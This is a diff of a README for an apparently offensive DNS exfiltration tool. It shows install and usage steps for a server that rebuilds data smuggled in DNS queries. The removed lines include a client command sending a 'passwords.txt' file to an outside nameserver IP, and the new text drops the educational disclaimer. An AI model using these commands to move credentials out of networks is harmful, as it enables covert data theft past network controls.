@@ -1,63 +1,77 @@
-## DNS-Exfiltration
+# DNS Exfiltration Server
 
-### Overview
+A Python-based DNS server that can receive and reconstruct data transmitted through DNS queries. This tool is useful for data exfiltration scenarios where traditional network communication methods are restricted.
 
-This project contains two scripts: `server.py` and `client.py`. These scripts are used to demonstrate DNS exfiltration, where data is covertly sent from a client to a server using DNS queries.
+## Features
 
-### server.py
+- Receives data chunks through DNS queries
+- Reconstructs data from base64-encoded chunks
+- Configurable chunk size and total data size limits
+- Colored console output for better visibility
+- File and console logging
+- Rate limiting to prevent DoS attacks
+- Configurable through a central configuration file
 
-The `server.py` script sets up a DNS server that listens for DNS queries. It extracts data from the subdomain of incoming DNS queries, decodes it, and saves it to a specified file.
+## Installation
 
-### client.py
-
-The `client.py` script is used to send data to the DNS server by encoding the data in the subdomain of DNS queries. 
-
-### Prerequisites
-
-- Python 3.x
-- dnslib
-- colorama
-
-You can install the required Python packages using pip:
-
-### Usage
-
-#### Running the DNS Server
-
-1. Run the `server.py` script with the `-o` or `--output` option to specify the output file where the exfiltrated data will be saved.
-
+1. Clone the repository:
 ```bash
-python3 ./server.py -o output.txt
-``` 
-
-Pro Server Options
-
-```bash
-python3 ./server.py -o output.txt -p 53
+git clone https://github.com/yourusername/DNS-Exfiltration.git
+cd DNS-Exfiltration
 ```
 
-The server will start listening on port `53` for incoming DNS queries.
-
-#### Running the DNS Client
-
-1. Use the `client.py` script to send data to the DNS server. This script will encode the data and send it in the subdomain of DNS queries to the server.
-
-Here's an example of how to run the client script:
-
+2. Install dependencies:
 ```bash
-python3 ./client.py -d "google.com" -f "passwords.txt"
+pip install -r requirements.txt
 ```
 
-Pro Client Options
+## Usage
 
+Run the server with default settings:
 ```bash
-python3 client.py -d legitimate-domain.com -f passwords.txt -p 53 --nameserver 10.10.166.126
+python server.py -o output.txt
 ```
 
-In this example, `legitimate-domain.com` is the domain to which the DNS queries will be sent, and `passwords` is the file containing the data to be exfiltrated.
+Run the server with custom port:
+```bash
+python server.py -o output.txt -p 5353
+```
+
+### Command Line Arguments
+
+- `-o, --output`: Path to the output file (required)
+- `-p, --port`: Server listening port (default: 53)
+
+## Configuration
+
+The server can be configured through the `config.py` file. Available settings include:
+
+- Port number
+- Server address
+- Maximum chunk size
+- Maximum total data size
+- Chunk timeout
+- Log directory
+- Output directory
+- Authentication requirements
+- Rate limiting
+
+## Security Considerations
+
+- The server includes rate limiting to prevent DoS attacks
+- Optional authentication can be enabled
+- Configurable size limits to prevent memory issues
+- Input validation for all parameters
+
+## Logging
+
+Logs are stored in the `logs` directory with timestamps. Both file and console logging are supported.
+
+## Contributing
 
 ![](https://i.imgur.com/f2D0Z7p.png)
+Contributions are welcome! Please feel free to submit a Pull Request.
 
-### Note
+## License
 
-This project is for educational purposes only. Unauthorized data exfiltration is illegal and unethical. Always obtain proper authorization before testing any security mechanism.
+This project is licensed under the MIT License - see the LICENSE file for details.
